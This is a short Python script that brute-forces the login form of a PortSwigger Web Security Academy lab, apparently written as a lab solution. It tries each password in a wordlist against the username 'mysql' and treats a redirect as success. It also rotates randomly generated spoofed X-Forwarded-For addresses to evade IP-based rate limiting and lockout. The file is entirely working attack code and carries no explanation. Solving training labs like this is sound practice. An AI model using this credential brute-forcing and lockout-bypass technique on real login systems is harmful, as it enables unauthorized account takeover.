import random
import requests
import time

burp0_url = "https://0a8700ea04ee977b8168d073003d0076.web-security-academy.net/login"
burp0_headers = {"Content-Type": "application/x-www-form-urlencoded", "X-Forwarded-For": "8.8.8.9"}
burp0_data = {"username": "wiener", "password": "password"}

USERNAME = "mysql"

IP_INDEX = 0
RANDOM_IPS = [f"{random.randint(20,250)}.{random.randint(20,250)}.{random.randint(20,250)}.{random.randint(20,250)}" for _ in range(100)]

def is_valid_password(password: str):
    global USERNAME, IP_INDEX, RANDOM_IPS

    data = burp0_data.copy()
    data["password"] = password
    data["username"] = USERNAME

    headers = burp0_headers.copy()
    headers["X-Forwarded-For"] = RANDOM_IPS[IP_INDEX]
    IP_INDEX = (IP_INDEX + 1) % len(RANDOM_IPS)

    r = requests.post(burp0_url, headers=headers, data=data, allow_redirects=False)
    
    if 300 <= r.status_code <= 399:
        return True
    return False

# print(is_valid_password("peter"))
# print(is_valid_password("peter2"))

with open('portswigger-wordlists/passwords', 'r') as file:
    for line in file:
        line = line.strip()
        
        if is_valid_password(line):
            print(f"Found password: {line}")
